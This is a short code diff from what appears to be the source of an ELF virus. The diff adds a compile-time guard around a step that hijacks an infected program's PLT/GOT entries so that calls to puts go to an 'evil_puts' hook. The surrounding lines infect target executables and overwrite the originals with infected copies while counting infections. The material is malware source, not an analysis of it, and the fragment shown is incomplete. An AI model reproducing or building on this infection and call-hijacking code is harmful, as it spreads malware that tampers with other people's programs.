@@ -741,6 +741,7 @@ infect:
 			load_target(fpath, &target);
 			new_base = infect_elf_file(&self, &target);
 			unload_target(&target);
+#ifdef INFECT_PLTGOT
 			load_target_writeable(TMP, &target);
 			base_addr = PIC_RESOLVE_ADDR(&_start);
 			evilputs_addr = PIC_RESOLVE_ADDR(&evil_puts);
@@ -748,6 +749,7 @@ infect:
 			evilputs_offset = evilputs_addr - base_addr;
 			infect_pltgot(&target, new_base + (evilputs_offset - 256));
 			unload_target(&target);
+#endif
 			_rename(TMP, fpath);
 			icount++;
 		}
